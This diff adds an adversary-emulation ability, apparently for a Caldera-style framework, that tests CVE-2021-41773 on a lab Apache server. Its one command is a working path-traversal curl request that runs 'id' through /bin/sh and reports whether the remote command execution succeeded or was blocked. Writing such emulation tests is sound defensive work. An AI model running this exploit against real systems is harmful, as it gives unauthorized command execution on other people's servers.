@@ -1,0 +1,31 @@
+- tactic: execution
+  technique_name: Exploit Public-Facing Application
+  technique_id: T1190
+  name: RCE execute id WEB-01
+  description: "Explota CVE-2021-41773 para ejecutar comandos arbitrarios mediante RCE a través de mod_cgi"
+  executors:
+  - name: sh
+    platform: linux
+    command: curl -s --path-as-is --data "echo;id" "http://192.168.56.105/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      | grep -q "uid=" && echo "RCE OK" || (echo "RCE BLOQUEADO" && exit 1)
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - execution
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: ce09e614-cb13-4005-8975-2d91f84cf24a
